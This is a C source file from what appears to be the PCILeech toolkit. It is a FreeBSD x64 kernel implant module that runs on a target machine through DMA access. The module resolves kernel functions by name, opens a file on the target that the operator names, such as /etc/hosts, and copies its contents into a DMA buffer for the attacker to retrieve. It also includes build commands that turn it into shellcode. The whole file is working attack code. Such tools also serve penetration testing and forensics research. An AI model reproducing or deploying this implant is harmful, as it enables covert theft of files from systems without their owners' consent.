// fbsdx64_filepull.c : kernel code to pull files from target system.
// Compatible with FreeBSD x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel fbsdx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel fbsdx64_filepull.c
// ml64 fbsdx64_common_a.asm /Felx64_filepull.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main fbsdx64_filepull.obj fbsdx64_common.obj
// shellcode64.exe -o fbsdx64_filepull.exe "PULL FILES FROM TARGET SYSTEM                                  \nFreeBSD x64 EDITION                                            \n===============================================================\nPull a file from the target system to the local system.        \nREQUIRED OPTIONS:                                              \n  -out : file on local system to write result to.              \n         filename is given in normal format.                   \n         Example: '-out c:\temp\hosts'                         \n  -s : file on target system.                                  \n         Example: '-s /etc/hosts'                              \n===== PULL ATTEMPT DETAILED RESULT INFORMATION ================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\n===============================================================\n"
// 

#include "fbsdx64_common.h"

#define LOOKUP				0 
#define FOLLOW				0x0040
#define AT_FDCWD			-100
#define FREAD				0x0001
#define FWRITE				0x0002
#define NDF_NO_FREE_PNBUF	0x00000020
#define NDF_ONLY_PNBUF		(~NDF_NO_FREE_PNBUF)
#define IO_NODELOCKED		0x0008

enum uio_seg {
	UIO_USERSPACE,
	UIO_SYSSPACE,
	UIO_NOCOPY
};

enum uio_rw {
	UIO_READ,
	UIO_WRITE
};

struct vattr {
	QWORD _opaque1[4];
	QWORD va_size;
	QWORD _opaque2[32];
};

struct vop_getattr_args {
	QWORD a_gen_a_desc;
	QWORD a_vp;
	QWORD a_vattr;
	QWORD a_cred;
};

struct vop_unlock_args {
	QWORD a_gen_a_desc;
	QWORD a_vp;
	QWORD a_flags;
};

struct nameidata {
	QWORD _opaque1[12];
	QWORD vnode;
	QWORD _opaque2[32];
};

typedef struct tdFN2 {
	QWORD NDINIT_ALL;
	QWORD NDFREE;
	QWORD VOP_GETATTR_APV;
	QWORD VOP_UNLOCK_APV;
	QWORD memcpy;
	QWORD vn_close;
	QWORD vn_open;
	QWORD vn_rdwr;
	QWORD vop_getattr_desc;
	QWORD vop_unlock_desc;
} FN2, *PFN2;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD i = 0, NAMES[sizeof(FN2) / sizeof(QWORD)], *pfn_qw = (PQWORD)pfn2;
	NAMES[i++] = (QWORD)(CHAR[]) { 'N', 'D', 'I', 'N', 'I', 'T', '_', 'A', 'L', 'L', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'N', 'D', 'F', 'R', 'E', 'E', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'V', 'O', 'P', '_', 'G', 'E', 'T', 'A', 'T', 'T', 'R', '_', 'A', 'P', 'V', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'V', 'O', 'P', '_', 'U', 'N', 'L', 'O', 'C', 'K', '_', 'A', 'P', 'V', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'n', '_', 'c', 'l', 'o', 's', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'n', '_', 'o', 'p', 'e', 'n', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'n', '_', 'r', 'd', 'w', 'r', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'o', 'p', '_', 'g', 'e', 't', 'a', 't', 't', 'r', '_', 'd', 'e', 's', 'c', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'o', 'p', '_', 'u', 'n', 'l', 'o', 'c', 'k', '_', 'd', 'e', 's', 'c', 0 };
	for(i = 0; i < sizeof(FN2) / sizeof(QWORD); i++) {
		pfn_qw[i] = LookupFunctionFreeBSD(pk, (CHAR*)NAMES[i]);
		if(!pfn_qw[i]) { return FALSE; }
	}
	return TRUE;
}

QWORD GetFileSize(PFN2 pfn2, QWORD vnode)
{
	struct vop_getattr_args a;
	struct vattr vattr;
	a.a_gen_a_desc = pfn2->vop_getattr_desc;
	a.a_vp = vnode;
	a.a_vattr = (QWORD)&vattr;
	a.a_cred = 0;
	if(SysVCall(pfn2->VOP_GETATTR_APV, *(PQWORD)(vnode + 0x08) /* v_op is 2nd entry in vnode */, &a)) {
		return 0;
	}
	return vattr.va_size;
}

VOID VOP_UNLOCK(PFN2 pfn2, QWORD vnode, QWORD flags)
{
	struct vop_unlock_args a;
	a.a_gen_a_desc = pfn2->vop_unlock_desc;
	a.a_vp = vnode;
	a.a_flags = flags;
	SysVCall(pfn2->VOP_UNLOCK_APV, *(PQWORD)(vnode + 0x08) /* v_op is 2nd entry in vnode */, &a);
}

VOID c_EntryPoint(PKMDDATA pk)
{
	FN2 fn2;
	struct nameidata nd;
	QWORD flags, fsize, error;
	if(!pk->dataInStr[0]) {
		pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
		return;
	}
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	SysVCall(fn2.NDINIT_ALL, &nd, LOOKUP, FOLLOW, UIO_SYSSPACE, pk->dataInStr, AT_FDCWD, 0, 0, curthread);
	flags = FREAD;
	if(SysVCall(fn2.vn_open, &nd, &flags, 0, 0)) {
		SysVCall(fn2.NDFREE, &nd, NDF_ONLY_PNBUF);
		pk->dataOut[0] = STATUS_FAIL_FILE_CANNOT_OPEN;
		return;
	}
	fsize = GetFileSize(&fn2, nd.vnode);
	if(fsize == 0 || fsize > pk->dataOutExtraLengthMax) {
		SysVCall(fn2.NDFREE, nd, NDF_ONLY_PNBUF);
		pk->dataOut[0] = STATUS_FAIL_FILE_SIZE;
		return;
	}
	error = SysVCall(fn2.vn_rdwr, UIO_READ, nd.vnode, (pk->DMAAddrVirtual + pk->dataOutExtraOffset), fsize, 0, UIO_SYSSPACE, IO_NODELOCKED, 0, 0, 0, curthread);
	if(error) {
		SysVCall(fn2.NDFREE, &nd, NDF_ONLY_PNBUF);
		pk->dataOut[0] = STATUS_FAIL_FILE_READWRITE;
		return;
	}
	pk->dataOutExtraLength = fsize;
	VOP_UNLOCK(&fn2, nd.vnode, 0);
	SysVCall(fn2.vn_close, nd.vnode, FREAD, 0, curthread);
	SysVCall(fn2.memcpy, pk->dataOutStr, pk->dataInStr, MAX_PATH);
}
